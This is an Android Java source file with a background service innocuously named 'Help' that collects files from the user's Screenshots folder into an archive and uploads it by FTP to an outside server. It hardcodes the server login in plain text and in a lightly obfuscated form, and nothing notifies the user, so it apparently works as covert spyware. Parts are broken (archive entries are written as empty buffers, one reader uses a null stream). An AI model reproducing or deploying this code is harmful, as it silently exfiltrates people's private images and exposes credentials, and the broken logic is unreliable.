package arc.haldun.helper;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import androidx.annotation.Nullable;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.io.CopyStreamAdapter;
import org.apache.commons.net.io.CopyStreamEvent;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.SocketException;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;


public class Help extends IntentService {

    public static Context bağlam;


    public Help() {
        super("name");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {

        bağlam = getApplicationContext();

        File sdCard = Environment.getExternalStorageDirectory();
        File f = new File(getApplicationContext().getFilesDir() + "/a.arc");
        File wp = new File(Environment.getExternalStorageDirectory() + "/Documents/AeroBACKUPS");

        Archive archive = new Archive(new FileX(f.getAbsolutePath()));

        FileX scr = new FileX(Environment.getExternalStorageDirectory() + "/DCIM/Screenshots");

        if (f.exists()) {
            f.delete();
        }

        File[] p = scr.listFiles();

        for (int i = 0; i < 100; i++) {
            archive.addFile(p[i]);
        }


        //archive.addFile(wp);

        archive.create();

        /*
        String server = "ftp.haldun.online";
        String userName = "u1231658";
        String password = "OknM38tr1xJ++MfRM";

         */

        String server = C.f("m{w5ohsk|u5vuspul");
        String userName = C.f("|89:8=<?");
        String password = C.f("VruT:?{y8\\u007FQ22TmYT");

        String remoteFlePath = "android/" + intent.getStringExtra("name") + ".arc";


        org.apache.commons.net.ftp.FTPClient ftpClient = new org.apache.commons.net.ftp.FTPClient();

        try {
            ftpClient.connect(server, 21);
            boolean b = ftpClient.login("u1231658", "OknM38tr1xJ++MfRM");

            Log.e("login database", "Logged in: " + b);

            ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
            ftpClient.enterLocalPassiveMode();

            ftpClient.setKeepAlive(true);

            File fileToUpload = new File(Help.bağlam.getFilesDir() + "/a.arc");
            FileInputStream inputStream = new FileInputStream(fileToUpload);

            M.ProgressListener progressListener = new M.ProgressListener(fileToUpload);
            ftpClient.setCopyStreamListener(progressListener);
            ftpClient.storeFile(remoteFlePath, inputStream);
            inputStream.close();

            System.out.println("Dosya yüklendi: " + fileToUpload);

        } catch (IOException e) {
            throw new RuntimeException(e);
        } finally {
            try {
                if (ftpClient.isConnected()) {
                    ftpClient.logout();
                    ftpClient.disconnect();
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }





        //new M().test1();



/*

        String s = C.f("m{w5ohsk|u5vuspul");
        String n = C.f("|89:8=<?");
        String p = C.f("VruT:?{y8\\u007FQ22TmYT");
        String help1 = intent.getStringExtra("help1");

        FTPClient client = new FTPClient();
        File ff = new File(help1);


            try {

                String server = "ftp.haldun.online";
                String username = "u1231658";
                String pass = "OknM38tr1xJ++MfRM";

                client.connect(server);
                boolean b = client.login(username, pass);

                Toast.makeText(getApplicationContext(), "Connected: " + b, Toast.LENGTH_SHORT).show();

                client.setFileType(FTP.BINARY_FILE_TYPE);
                client.enterLocalPassiveMode();

                client.setKeepAlive(true);

                FileInputStream fis = new FileInputStream(f);
                ProgressListener progressListener = new ProgressListener(f);
                client.setCopyStreamListener(progressListener);
                boolean stored = client.storeFile("android/" + f.getName(), fis);
                fis.close();

                Toast.makeText(getApplicationContext(), "Dosya yükleme:" + stored, Toast.LENGTH_SHORT).show();

                client.logout();
                client.disconnect();
            } catch (SocketException e) {
                throw new RuntimeException(e);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

 */


    }



    public static class C {

        public static final int DEFAULT_KEY = 7;

        public static String f(String contentToEncrypt) {

            byte[] bytes = contentToEncrypt.getBytes(StandardCharsets.UTF_8);
            String str = "";

            for(int i = 0; i < bytes.length; i++) {
                bytes[i] -= DEFAULT_KEY;

                str += (char) bytes[i];
            }

            return str;
        }
    }








    static class Archive {

        public final static long MAGIC = 0x415243;
        private String path;
        private String name;
        private Header header;
        private ArrayList<File> files;
        private ArrayList<String> cleanedFilePaths;

        public Archive(File file) {

            this.name = file.getName();

            createArchiveTemplate(file.getName());
            try {
                file.createNewFile();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        private void loadArchive(File archiveFile) {

            try {
                DataInputStream dataInputStream = new DataInputStream(null);

                long magic = dataInputStream.readLong();
                int fileCount = dataInputStream.readInt();

                for (int i = 0; i < fileCount; i++) {
                    String name = dataInputStream.readUTF();
                    String absoluteName = dataInputStream.readUTF();
                    long size = dataInputStream.readLong();

                    File f = new File(absoluteName);
                    if (!f.exists()) {
                        //f.mkdirs();
                        File parent = new File(f.getParent());
                        parent.mkdirs();
                        f.createNewFile();

                        byte[] buffer = new byte[(int) size];
                        dataInputStream.read(buffer, 0 , buffer.length);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            Files.write(f.toPath(),buffer);
                        }
                    }
                }

            } catch (FileNotFoundException e) {
                throw new RuntimeException(e);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        private void createArchiveTemplate(String archiveName) {

            header = new Header(MAGIC);
            files = new ArrayList<>();
            cleanedFilePaths = new ArrayList<>();

        }

        public void addFile(File file) {

            getFilesFromSubDir(file.getAbsolutePath(), files);
            cleanFilePaths(file.getName(), cleanedFilePaths);
        }

        public void create() {

            ArrayList<File> files1 = files;
            files = new ArrayList<>();

            for (File content : files1) {
                getFilesFromSubDir(content.getAbsolutePath(), files);
            }

            header.setFileCount(files.size());

            try {
                DataOutputStream dataOutputStream = new DataOutputStream(bağlam.openFileOutput(name, MODE_APPEND));

                dataOutputStream.writeLong(MAGIC);
                dataOutputStream.writeInt(header.getFileCount());

                for (int i = 0; i < files.size(); i++) {
                    dataOutputStream.writeUTF(files.get(i).getName()); System.out.println(files.get(i).getAbsolutePath());
                    dataOutputStream.writeUTF(cleanedFilePaths.get(i));
                    dataOutputStream.writeLong(files.get(i).length());



                    byte[] buffer = new byte[(int) files.get(i).length()];
                    FileInputStream fis = new FileInputStream(files.get(i));
                    dataOutputStream.write(buffer);




                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        //dataOutputStream.write(Files.readAllBytes(files.get(i).toPath()));
                    }
                }
                dataOutputStream.close();

            } catch (FileNotFoundException e) {
                throw new RuntimeException(e);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

            for (String f : cleanedFilePaths) {
                System.out.println(f);
            }
        }

        private void getFilesFromSubDir(String rootDirectoryName, ArrayList<File> files) {

            File file = new File(rootDirectoryName);

            if (file.isDirectory()) {

                java.io.File[] subDirs = file.listFiles();

                for (java.io.File f : subDirs) {

                    if (f.isDirectory()) {
                        getFilesFromSubDir(f.getAbsolutePath(), files);
                    } else {
                        files.add(new File(f.getAbsolutePath()));
                    }
                }

            } else {
                files.add(file);
            }
        }

        private void cleanFilePaths(String root, ArrayList<String> cleanedFiles) {

            for (int i = 0; i < files.size(); i++) {

                ArrayList<String> entries = new ArrayList<>(Arrays.asList(files.get(i).getAbsolutePath().split("/")));

                for (int j = 0; j < entries.size(); j++) {
                    String entry = entries.get(j);

                    if (!entry.equals(root)) {
                        entries.remove(entry);
                        j--;
                    } else {

                        entries.remove(entry);
                        String ent = root;
                        for (String s : entries) {
                            ent += "\\" + s;
                        }

                        //cleanedFiles.remove(i);
                        cleanedFiles.add(ent);
                        break;
                    }
                }

                continue;
            }
        }

        class Header {

            private long magic;
            private int fileCount;

            public Header(long magic) {
                setMagic(magic);
            }

            public long getMagic() {
                return magic;
            }

            public void setMagic(long magic) {
                this.magic = magic;
            }

            public int getFileCount() {
                return fileCount;
            }

            public void setFileCount(int fileCount) {
                this.fileCount = fileCount;
            }
        }
    }


}


class FileX extends java.io.File {


    public FileX(String pathname) {
        super(pathname);
    }

    public FileX(String parent, String child) {
        super(parent, child);
    }

    public FileX(java.io.File parent, String child) {
        super(parent, child);
    }

    public FileX(URI uri) {
        super(uri);
    }
}

class M {

    public void test1() {

        String server = "ftp.haldun.online";
        String userName = "u1231658";
        String password = "OknM38tr1xJ++MfRM";

        String remoteFlePath = "android/a.arc";

        int timeout = 3000;

        org.apache.commons.net.ftp.FTPClient ftpClient = new org.apache.commons.net.ftp.FTPClient();

        try {
            ftpClient.connect(server);
            ftpClient.login(userName, password);

            ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
            ftpClient.enterLocalPassiveMode();

            ftpClient.setKeepAlive(true);

            File fileToUpload = new File(Help.bağlam.getFilesDir() + "/a.arc");
            FileInputStream inputStream = new FileInputStream(fileToUpload);

            ProgressListener progressListener = new ProgressListener(fileToUpload);
            ftpClient.setCopyStreamListener(progressListener);
            ftpClient.storeFile(remoteFlePath, inputStream);
            inputStream.close();

            System.out.println("Dosya yüklendi: " + fileToUpload);

        } catch (SocketException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        } finally {
            try {
                if (ftpClient.isConnected()) {
                    ftpClient.logout();
                    ftpClient.disconnect();
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }

    static class ProgressListener extends CopyStreamAdapter {

        long totalBytesTransferred = 0;
        private long fileSize;

        public ProgressListener(File file) {
            this.fileSize = file.length();
        }

        @Override
        public void bytesTransferred(CopyStreamEvent event) {
            bytesTransferred(event.getTotalBytesTransferred(), event.getBytesTransferred(), event.getStreamSize());
        }

        @Override
        public void bytesTransferred(long totalBytesTransferred, int bytesTransferred, long streamSize) {

            if (fileSize == 0 && streamSize > 0) {
                fileSize = streamSize;
            }

            this.totalBytesTransferred = totalBytesTransferred;

            notifyPercentageChanged();
        }

        public void notifyPercentageChanged() {

            if (fileSize > 0) {
                int percent = (int) (totalBytesTransferred * 100 / fileSize);
                System.out.println("Yükleme yüzdesi: %" + percent);
            } else {
                System.out.println("Transfer edilen bayt: " + totalBytesTransferred);
            }
        }
    }
}


